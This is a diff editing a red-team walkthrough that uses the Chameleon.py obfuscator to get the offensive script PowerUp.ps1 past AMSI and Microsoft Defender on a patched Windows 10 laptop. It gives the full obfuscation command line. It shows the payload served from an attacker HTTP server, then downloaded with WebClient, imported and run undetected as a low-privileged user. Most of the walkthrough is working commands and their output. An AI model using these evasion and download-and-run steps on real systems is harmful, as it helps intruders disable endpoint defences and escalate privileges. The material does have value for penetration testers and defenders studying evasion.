@@ -2,14 +2,16 @@
 Simple AV bypass using the PowerShell obfuscation script 'Chameleon.py'
 =========================================================================================================================================================
 
-Chameleon is yet another PowerShell obfuscation tool designed to bypass AMSI and commercial antivirus solutions.
+Chameleon is a PowerShell obfuscation tool designed to bypass AMSI and commercial antivirus solutions.
 
 => Source: https://github.com/klezVirus/chameleon
+           https://klezvirus.github.io/RedTeaming/AV_Evasion/BornFromAChimera/
+           
+The objective is to use 'chameleon.py' to obfuscate offensive powershell scripts so we can copy them on the disk of a target Windows laptop or 
+Windows server and then run them without being detected and deleted by the Microsoft Defender AV (or other AV products).
 
-The objective is to use 'chameleon.py' to obfuscate offensive powershell scripts so we can copy them on the disk of a target Windows laptop or Windows server   
-and then run them without being detected and deleted by the Microsoft Defender AV (or other AV products).
-
-The tool has been developed as a Python port of the Chimera project.. As such, it uses mostly the same techniques to evade common detection signatures, such as:
+The tool has been developed as a Python port of the Chimera project. As such, it uses mostly the same techniques to evade common detection signatures, 
+such as:
 > comment deletion/substitution
 > string substitution (variables, functions, data-types)
 > variable concatenation
@@ -20,11 +22,11 @@ The tool has been developed as a Python port of the Chimera project.. As such, i
 
 
 =========================================================================================================================================================
-PoC - Example with the script 'PowerUp.ps1' running on a Windows 10 laptop (fully patched with Defender AV enabled and up-to-date)
+PoC - Example with the script 'PowerUp.ps1' running on a Windows 10 laptop (fully patched with the MS Defender AV enabled and up-to-date)
 =========================================================================================================================================================
 
 
-Step 1 - Obfuscate the script  'PowerUp.ps1' with Chameleon.py on a Kali VM
+Step 1 - Obfuscate the script 'PowerUp.ps1' with Chameleon.py on a Kali VM
 ----------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/chameleon-main$ python3 ./chameleon.py -K jeff -l 5 -a ./powerup.ps1 -o ./chameleon-p0w3rup1.ps1 --decimal
@@ -65,12 +67,13 @@ jeff@kali:~/Documents/Tools/chameleon-main$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
 
-Step 2 - Check that the obfuscated 'Invoke-WMIExec.ps1' is working properly without being detected by the AMSI / Defender AV
------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Check that the obfuscated script 'chameleon-p0w3rup1.ps1' is working properly without being detected by the AMSI / Defender AV
+----------------------------------------------------------------------------------------------------------------------------------------
+
+=> We use a low-privileged user account named "auditor"
 
 PS C:\temp> whoami
 laptop1\auditor
-
 
 PS C:\temp> net user auditor
 User name                    auditor
@@ -100,20 +103,21 @@ Global Group memberships     *None
 The command completed successfully.
 
 
-PS C:\temp> amsiscan
-amsiscan : The term 'amsiscan' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was
-included, verify that the path is correct and try again.
+=> The MS Defender AV is running with the "real-time protection" setting enabled.
+
+PS C:\temp> amsiscanbuffer
 At line:1 char:1
-+ amsiscan
-+ ~~~~~~~~
-    + CategoryInfo          : ObjectNotFound: (amsiscan:String) [], CommandNotFoundException
-    + FullyQualifiedErrorId : CommandNotFoundException
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
 
 
-PS C:\temp> (New-Object Net.WebClient).DownloadFile("http://192.168.1.30:8080/chameleon-p0w3rup1.ps1","C:\temp\chameleon-p0w3rup.ps1")
+=> We download and execute our obfuscated script 'chameleon-p0w3rup1.ps1' without being blocked by the MS Defender AV
 
+PS C:\temp> (New-Object Net.WebClient).DownloadFile("http://192.168.1.30:8080/chameleon-p0w3rup1.ps1","C:\temp\chameleon-p0w3rup1.ps1")
 PS C:\temp> import-module C:\temp\chameleon-p0w3rup1.ps1
-
 PS C:\temp> invoke-allchecks
 
 ServiceName                     : edgeupdate
